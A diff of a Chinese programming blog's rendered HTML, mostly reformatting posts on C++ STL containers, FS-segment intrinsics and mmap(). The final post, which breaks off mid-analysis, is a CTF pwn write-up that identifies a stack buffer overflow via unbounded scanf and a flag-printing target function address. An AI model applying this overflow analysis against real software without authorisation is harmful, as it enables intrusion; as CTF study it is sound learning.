@@ -192,7 +192,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-05 10:37:24" itemprop="dateModified" datetime="2021-09-05T10:37:24+08:00">2021-09-05</time>
+        <time title="Modified: 2021-09-07 08:43:31" itemprop="dateModified" datetime="2021-09-07T08:43:31+08:00">2021-09-07</time>
       </span>
 
   
@@ -206,31 +206,32 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>在leetcode上用C++提交代码需要学习一点点的class相关知识，还要熟悉题目提供的容器，以下</p>
-<h1 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h1><p>应该是使用了万用头，但在本地调试的时候需要手动添加头文件</p>
-<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>每个容器都提供了很多方法，这里只介绍最适用于这种数据结构的一些方法，并且在做题时候会常用的一些方法。</p>
-<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>vector 容器和数组是一样的，基本上除非题目输入定义了vector类型，自己也不太会引入vector。毕竟要多打很多字。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义：</span></span><br><span class="line">vector &lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line"><span class="comment">//访问：</span></span><br><span class="line">v[i];</span><br><span class="line"><span class="comment">//更新</span></span><br><span class="line">v[i]=a;<span class="comment">//为定义大小时不能直接访问，会导致下标越界</span></span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">v.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//末尾插入</span></span><br><span class="line">v.<span class="built_in">push_back</span>(a);</span><br><span class="line"><span class="comment">//末尾删除</span></span><br><span class="line">v.<span class="built_in">pop_back</span>();</span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line">v.<span class="built_in">clear</span>();</span><br><span class="line"><span class="comment">//判断空</span></span><br><span class="line">v.<span class="built_in">empty</span>();</span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());<span class="comment">//从小到大</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">rbegin</span>(),v.<span class="built_in">rend</span>());<span class="comment">//从大到小</span></span><br><span class="line"><span class="comment">//自定义排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a&lt; b; <span class="comment">//升序排列，如果改为return a&gt;b，则为降序 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),compare);</span><br><span class="line"><span class="comment">//翻转</span></span><br><span class="line"><span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure>
-
-<h2 id="set，multiset"><a href="#set，multiset" class="headerlink" title="set，multiset"></a>set，multiset</h2><p>set主要作用是自动去重，对于期望得到不重复的结果，使用set维护输出列表。由于set，multiset通过平衡二叉树实现，有自动排序功能。set不允许重复，multiset允许重复</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line">set&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line"><span class="comment">//添加元素</span></span><br><span class="line">s.<span class="built_in">insert</span>(i);</span><br><span class="line"><span class="comment">//删除元素</span></span><br><span class="line">s.<span class="built_in">erase</span>(i);</span><br><span class="line"><span class="comment">//查找元素 返回指针</span></span><br><span class="line">s.<span class="built_in">find</span>(i);</span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">s.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="keyword">int</span>&gt;::iterator it=s.<span class="built_in">begin</span>(); it!=s.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;*it&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//范围查找</span></span><br><span class="line">m.<span class="built_in">lower_bound</span>(elem);</span><br><span class="line">m.<span class="built_in">upper_bound</span>(elem);</span><br></pre></td></tr></table></figure>
-
+<h1 id="头文件">头文件</h1>
+<p>应该是使用了万用头，但在本地调试的时候需要手动添加头文件 # 容器</p>
+<p>每个容器都提供了很多方法，这里只介绍最适用于这种数据结构的一些方法，并且在做题时候会常用的一些方法。</p>
+<h2 id="vector">vector</h2>
+<p>vector 容器和数组是一样的，基本上除非题目输入定义了vector类型，自己也不太会引入vector。毕竟要多打很多字。 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义：</span></span><br><span class="line">vector &lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line"><span class="comment">//访问：</span></span><br><span class="line">v[i];</span><br><span class="line"><span class="comment">//更新</span></span><br><span class="line">v[i]=a;<span class="comment">//为定义大小时不能直接访问，会导致下标越界</span></span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">v.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//末尾插入</span></span><br><span class="line">v.<span class="built_in">push_back</span>(a);</span><br><span class="line"><span class="comment">//末尾删除</span></span><br><span class="line">v.<span class="built_in">pop_back</span>();</span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line">v.<span class="built_in">clear</span>();</span><br><span class="line"><span class="comment">//判断空</span></span><br><span class="line">v.<span class="built_in">empty</span>();</span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());<span class="comment">//从小到大</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">rbegin</span>(),v.<span class="built_in">rend</span>());<span class="comment">//从大到小</span></span><br><span class="line"><span class="comment">//自定义排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a&lt; b; <span class="comment">//升序排列，如果改为return a&gt;b，则为降序 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),compare);</span><br><span class="line"><span class="comment">//翻转</span></span><br><span class="line"><span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure></p>
+<h2 id="setmultiset">set，multiset</h2>
+<p>set主要作用是自动去重，对于期望得到不重复的结果，使用set维护输出列表。由于set，multiset通过平衡二叉树实现，有自动排序功能。set不允许重复，multiset允许重复 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line">set&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line"><span class="comment">//添加元素</span></span><br><span class="line">s.<span class="built_in">insert</span>(i);</span><br><span class="line"><span class="comment">//删除元素</span></span><br><span class="line">s.<span class="built_in">erase</span>(i);</span><br><span class="line"><span class="comment">//查找元素 返回指针</span></span><br><span class="line">s.<span class="built_in">find</span>(i);</span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">s.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="keyword">int</span>&gt;::iterator it=s.<span class="built_in">begin</span>(); it!=s.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;*it&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//范围查找</span></span><br><span class="line">m.<span class="built_in">lower_bound</span>(elem);</span><br><span class="line">m.<span class="built_in">upper_bound</span>(elem);</span><br></pre></td></tr></table></figure></p>
 <p>注：</p>
 <p>c++ vector和set的区别</p>
-<p>STL中的容器可以分为两大类：<br>1、顺序容器：list，queue，vector<br>2、关联容器：map，set（当然对应的有multimap，multiset）<br>其中vector的存储结构是数组，其它的存储结构是链表。</p>
+<p>STL中的容器可以分为两大类： 1、顺序容器：list，queue，vector 2、关联容器：map，set（当然对应的有multimap，multiset） 其中vector的存储结构是数组，其它的存储结构是链表。</p>
 <p>首先vector属于顺序容器，其元素与存储位置与操作操作有关；set属于关联容器，其元素相当于键值。set能够保证它里面所有的元素都是不重复的（multiset除外）。</p>
 <p>其次，由于存储结构不同，vector擅长于解决某个位置是什么值的问题，而set擅长于解决，某个元素在那个位置的问题，知道元素的内容，查找它的位置。因此vector特别好的支持随机访问，而set不支持（不支持下标访问）。</p>
-<h2 id="map，multimap，hashmap"><a href="#map，multimap，hashmap" class="headerlink" title="map，multimap，hashmap"></a>map，multimap，hashmap</h2><p>map是一个使用键值对key-value 模式的容器，map不允许重复键值，而multimap允许重复键值。适用于词频统计类的问题。map的底层是红黑树。<br>hashmap操作与map相同，但是底层是hash表，可以在O(1)时间内完成访问操作。</p>
+<h2 id="mapmultimaphashmap">map，multimap，hashmap</h2>
+<p>map是一个使用键值对key-value 模式的容器，map不允许重复键值，而multimap允许重复键值。适用于词频统计类的问题。map的底层是红黑树。 hashmap操作与map相同，但是底层是hash表，可以在O(1)时间内完成访问操作。</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line">map&lt;<span class="keyword">char</span>*, <span class="keyword">int</span>&gt; m;</span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line">m.<span class="built_in">insert</span>(pair&lt;<span class="keyword">char</span> *, <span class="keyword">int</span>&gt;(key,value))</span><br><span class="line">m[key]=value;</span><br><span class="line"><span class="comment">//删除 </span></span><br><span class="line">m.<span class="built_in">erase</span>(key);</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">m[key];<span class="comment">//如果没有这个key，则返回0</span></span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="keyword">char</span> *,<span class="keyword">int</span>&gt;::iterator it=m.<span class="built_in">begin</span>();it!=m.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;it-&gt;first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;it-&gt;second&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">m.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line">m.<span class="built_in">clear</span>();</span><br></pre></td></tr></table></figure>
-
-<h1 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h1><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造</span></span><br><span class="line">string s=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *a=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">string s = a;</span><br><span class="line"><span class="comment">//拼接</span></span><br><span class="line">a+b</span><br><span class="line"><span class="comment">//子串</span></span><br><span class="line">a.<span class="built_in">substr</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//查找</span></span><br><span class="line">a.<span class="built_in">find</span>(<span class="string">&quot;12&quot;</span>);<span class="comment">//返回字串第一个字符的下标，如果没有找到，返回string::npos</span></span><br><span class="line"><span class="comment">//替换</span></span><br><span class="line">a.<span class="built_in">replace</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;ab&quot;</span>); <span class="comment">//ab3</span></span><br><span class="line"><span class="comment">//删除子串</span></span><br><span class="line">a.<span class="built_in">erase</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//长度</span></span><br><span class="line">a.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">a[i];</span><br><span class="line"><span class="comment">//转成char *</span></span><br><span class="line">a.<span class="built_in">c_str</span>();</span><br></pre></td></tr></table></figure>
-
-<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><p>遇到再说</p>
-<h2 id="next-permutation"><a href="#next-permutation" class="headerlink" title="next_permutation()"></a>next_permutation()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">5</span>]=&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">            cout&lt;&lt;a[i];</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;<span class="keyword">while</span> (<span class="built_in">next_permutation</span>(a,a+<span class="number">3</span>));</span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//132</span></span><br><span class="line"><span class="comment">//213</span></span><br><span class="line"><span class="comment">//231</span></span><br><span class="line"><span class="comment">//312</span></span><br><span class="line"><span class="comment">//321</span></span><br></pre></td></tr></table></figure>
-<p>注：部分转载于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yao09605/article/details/106156743">https://blog.csdn.net/yao09605/article/details/106156743</a></p>
+<h1 id="常用类">常用类</h1>
+<h2 id="string">string</h2>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造</span></span><br><span class="line">string s=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *a=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">string s = a;</span><br><span class="line"><span class="comment">//拼接</span></span><br><span class="line">a+b</span><br><span class="line"><span class="comment">//子串</span></span><br><span class="line">a.<span class="built_in">substr</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//查找</span></span><br><span class="line">a.<span class="built_in">find</span>(<span class="string">&quot;12&quot;</span>);<span class="comment">//返回字串第一个字符的下标，如果没有找到，返回string::npos</span></span><br><span class="line"><span class="comment">//替换</span></span><br><span class="line">a.<span class="built_in">replace</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;ab&quot;</span>); <span class="comment">//ab3</span></span><br><span class="line"><span class="comment">//删除子串</span></span><br><span class="line">a.<span class="built_in">erase</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//长度</span></span><br><span class="line">a.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">a[i];</span><br><span class="line"><span class="comment">//转成char *</span></span><br><span class="line">a.<span class="built_in">c_str</span>();</span><br></pre></td></tr></table></figure>
+<h1 id="常用函数">常用函数</h1>
+<p>遇到再说 ## next_permutation() <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">5</span>]=&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">            cout&lt;&lt;a[i];</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;<span class="keyword">while</span> (<span class="built_in">next_permutation</span>(a,a+<span class="number">3</span>));</span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//132</span></span><br><span class="line"><span class="comment">//213</span></span><br><span class="line"><span class="comment">//231</span></span><br><span class="line"><span class="comment">//312</span></span><br><span class="line"><span class="comment">//321</span></span><br></pre></td></tr></table></figure> 注：部分转载于：https://blog.csdn.net/yao09605/article/details/106156743</p>
 <p>注：STL应在 学会在C里手写 后使用</p>
-<h1 id="VS本地配置"><a href="#VS本地配置" class="headerlink" title="VS本地配置"></a>VS本地配置</h1><p>首先简化输入输出，实现某算法的功能后移植到类中</p>
+<h1 id="vs本地配置">VS本地配置</h1>
+<p>首先简化输入输出，实现某算法的功能后移植到类中</p>
 <p>eg1：第一题</p>
 <img src="/2021/05/09/%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/1.png" class>
+
       
     </div>
 
@@ -287,7 +288,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-11 23:16:41" itemprop="dateModified" datetime="2021-09-11T23:16:41+08:00">2021-09-11</time>
+        <time title="Modified: 2021-09-13 22:46:14" itemprop="dateModified" datetime="2021-09-13T22:46:14+08:00">2021-09-13</time>
       </span>
 
   
@@ -543,39 +544,43 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     
     <div class="post-body" itemprop="articleBody">
           <p>从相对于 FS 段开头的偏移量指定的位置读取内存。</p>
-<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>C</p>
+<h2 id="语法">语法</h2>
+<p>C</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> __readfsbyte(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> __readfsword(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __readfsdword(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br><span class="line"><span class="keyword">unsigned</span> __int64 __readfsqword(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br></pre></td></tr></table></figure>
-
-<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>字节、字、双字名为的函数的名称指示 <code>FS:[Offset]</code> 。</p>
-<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><table>
+<h2 id="返回值">返回值</h2>
+<p>字节、字、双字名为的函数的名称指示 <code>FS:[Offset]</code> 。</p>
+<h2 id="要求">要求</h2>
+<table>
 <thead>
-<tr>
+<tr class="header">
 <th>Intrinsic</th>
 <th>体系结构</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td><code>__readfsbyte</code></td>
 <td>x86</td>
 </tr>
-<tr>
+<tr class="even">
 <td><code>__readfsdword</code></td>
 <td>x86</td>
 </tr>
-<tr>
+<tr class="odd">
 <td><code>__readfsqword</code></td>
 <td>x86</td>
 </tr>
-<tr>
+<tr class="even">
 <td><code>__readfsword</code></td>
 <td>x86</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p><strong>头文件</strong> &lt;intrin.h&gt;</p>
 <p>例子：</p>
 <img src="/2021/04/29/read-byte-word/1.png" class>
-
 <img src="/2021/04/29/read-byte-word/2.png" class>
+
       
     </div>
 
@@ -641,48 +646,46 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     <div class="post-body" itemprop="articleBody">
           <p>getpagesize()获得分页大小</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize)//定义</span><br><span class="line">//说明：mmap()用来将某个文件内容映射到内存中，对该内存区域的存取即是直接对该文件内容的读写</span><br></pre></td></tr></table></figure>
-
 <table>
+<colgroup>
+<col style="width: 9%">
+<col style="width: 90%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>参数</th>
 <th>说明</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>start</td>
 <td>指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>length</td>
 <td>代表将文件中多大的部分对应到内存。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>prot</td>
-<td>代表映射区域的保护方式，有下列组合：1.PROT_EXEC  映射区域可被执行；2.PROT_READ  映射区域可被读取； PROT_WRITE  映射区域可被写入；3.PROT_NONE  映射区域不能存取。</td>
+<td>代表映射区域的保护方式，有下列组合：1.PROT_EXEC 映射区域可被执行；2.PROT_READ 映射区域可被读取； PROT_WRITE 映射区域可被写入；3.PROT_NONE 映射区域不能存取。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>flags</td>
-<td>会影响映射区域的各种特性： MAP_FIXED  如果参数 start 所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。 MAP_SHARED  对应射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。 MAP_PRIVATE  对应射区域的写入操作会产生一个映射文件的复制，即私人的”写入时复制” (copy on write)对此区域作的任何修改都不会写回原来的文件内容。 MAP_ANONYMOUS  建立匿名映射，此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。 MAP_DENYWRITE  只允许对应射区域的写入操作，其他对文件直接写入的操作将会被拒绝。 MAP_LOCKED  将映射区域锁定住，这表示该区域不会被置换(swap)。       在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</td>
+<td>会影响映射区域的各种特性： MAP_FIXED 如果参数 start 所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。 MAP_SHARED 对应射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。 MAP_PRIVATE 对应射区域的写入操作会产生一个映射文件的复制，即私人的"写入时复制" (copy on write)对此区域作的任何修改都不会写回原来的文件内容。 MAP_ANONYMOUS 建立匿名映射，此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。 MAP_DENYWRITE 只允许对应射区域的写入操作，其他对文件直接写入的操作将会被拒绝。 MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换(swap)。 在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>fd</td>
 <td>open()返回的文件描述词，代表欲映射到内存的文件。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>offset</td>
 <td>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>返回值：若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(-1)，错误原因存于errno 中。</p>
-<p>错误代码：</p>
-<ul>
-<li>EBADF  参数fd 不是有效的文件描述词。</li>
-<li>EACCES  存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用MAP_SHARED 则要有PROT_WRITE 以及该文件要能写入。</li>
-<li>EINVAL  参数start、length 或offset 有一个不合法。</li>
-<li>EAGAIN  文件被锁住，或是有太多内存被锁住。</li>
-<li>ENOMEM  内存不足。</li>
-</ul>
+<p>错误代码： - EBADF 参数fd 不是有效的文件描述词。 - EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用MAP_SHARED 则要有PROT_WRITE 以及该文件要能写入。 - EINVAL 参数start、length 或offset 有一个不合法。 - EAGAIN 文件被锁住，或是有太多内存被锁住。 - ENOMEM 内存不足。</p>
 
       
     </div>
@@ -753,18 +756,17 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     
     
     <div class="post-body" itemprop="articleBody">
-          <p><code>RELRO:    Partial RELRO</code><br><code>Stack:    No canary found</code><br><code>NX:       NX enabled</code><br><code>PIE:      No PIE (0x8048000)</code></p>
-<p>目前所学所有攻击手法均需要有输入漏洞<br>本题有两个入口<br>第二个入口可产生数据溢出<br><code>char v2[32]; // [esp+10h] [ebp-74h]</code><br><code>__isoc99_scanf(&quot;%s&quot;, v2);</code><br>v2真正大小只有：32个字节，即ebp-74到ebp-54</p>
+          <p><code>RELRO:    Partial RELRO</code> <code>Stack:    No canary found</code> <code>NX:       NX enabled</code> <code>PIE:      No PIE (0x8048000)</code></p>
+<p>目前所学所有攻击手法均需要有输入漏洞 本题有两个入口 第二个入口可产生数据溢出 <code>char v2[32]; // [esp+10h] [ebp-74h]</code> <code>__isoc99_scanf("%s", v2);</code> v2真正大小只有：32个字节，即ebp-74到ebp-54</p>
 <p>在从后往前分析一下：</p>
 <p>找到一个system函数可用，但没有关键字符串可用，或许可以自己构造</p>
-<p>又找到一个函数，几乎可以确定为目标函数<br>int sub_80486CC()<br>{<br>​    char s; // [esp+1Eh] [ebp-3Ah]<br>​    snprintf(&amp;s, 0x32u, “cat %s”, “./flag”);<br>​    return system(&amp;s);<br>}<br>  目标函数首地址为：0x080486CC</p>
+<p>又找到一个函数，几乎可以确定为目标函数 int sub_80486CC() { ​ char s; // [esp+1Eh] [ebp-3Ah] ​ snprintf(&amp;s, 0x32u, "cat %s", "./flag"); ​ return system(&amp;s); } 目标函数首地址为：0x080486CC</p>
 <p>找到一个反编译失败函数，地址：0x8048A61</p>
 <img src="/2021/04/11/AD-forgot/1.png" class>
-<p><code>  (*(&amp;v3 + --v14))();</code></p>
+<p><code>(*(&amp;v3 + --v14))();</code></p>
 <p>取v3函数的地址，对其进行偏移，得到一个新的地址，调用这个函数</p>
